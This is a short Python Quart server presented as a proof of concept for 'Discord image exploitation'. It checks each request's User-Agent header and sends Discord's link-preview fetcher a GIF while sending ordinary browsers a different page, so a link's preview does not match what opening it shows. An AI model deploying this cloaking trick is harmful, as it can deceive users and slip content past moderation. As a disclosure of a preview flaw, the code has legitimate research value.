from quart import Quart, request, send_file, render_template

app = Quart(__name__)

@app.route("/")
async def main():
    return "<center><b>POC for actual Discord image exploitation.</b><br>Send <a href='/kinky.gif'>this link</a> on Discord, and while using the electron client, compare the results of the discord image preview vs opening the original.</center>"

@app.route('/kinky.gif')
async def POC():
    userAgent = request.headers.get('User-Agent')
    print('[log]: useragent ' + userAgent + ' requested gif.')
    if ('Firefox/' in userAgent or 'Chrome/' in userAgent) and not userAgent == 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0':
        return await render_template('oops.html')
    else:
        return await send_file('actualGif.gif')

@app.route('/sfw.gif')
async def POCSFW():
    userAgent = request.headers.get('User-Agent')
    print('[log]: useragent ' + userAgent + ' requested gif.')
    if ('Firefox/' in userAgent or 'Chrome/' in userAgent) and not userAgent == 'Mozilla/5.0 (Macintosh; Intel Mac OS X 11.6; rv:92.0) Gecko/20100101 Firefox/92.0':
        return await render_template('oops.html')
    else:
        return await send_file('actualSfwGif.gif')

@app.route('/always.gif')
async def retGif():
    return await send_file('actualGif.gif')
